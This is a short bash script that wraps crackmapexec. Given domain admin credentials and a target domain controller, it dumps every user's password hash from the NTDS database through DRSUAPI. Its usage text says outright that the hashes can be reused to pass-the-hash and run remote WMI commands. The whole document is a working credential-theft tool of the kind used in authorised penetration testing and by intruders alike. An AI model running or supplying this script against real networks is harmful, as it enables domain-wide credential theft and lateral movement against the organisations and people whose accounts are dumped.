#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <domain> <username> <password> <target dc>"
	echo "$0 connects to a DC with the specified admin credentials and dumps the user account hashes from NTDS.  These can be used with crackmapexec to pass-the-hash (-H) to run WMI calls and perform other tasks."
}

if [ $# -lt 4 ]; then
	ShowUsage
	exit 1
fi

DOMAIN="$1"
USERNAME="$2"
PASSWORD="$3"
TARGETS="$4"

crackmapexec -d $DOMAIN -u $USERNAME -p $PASSWORD --ntds drsuapi $TARGETS

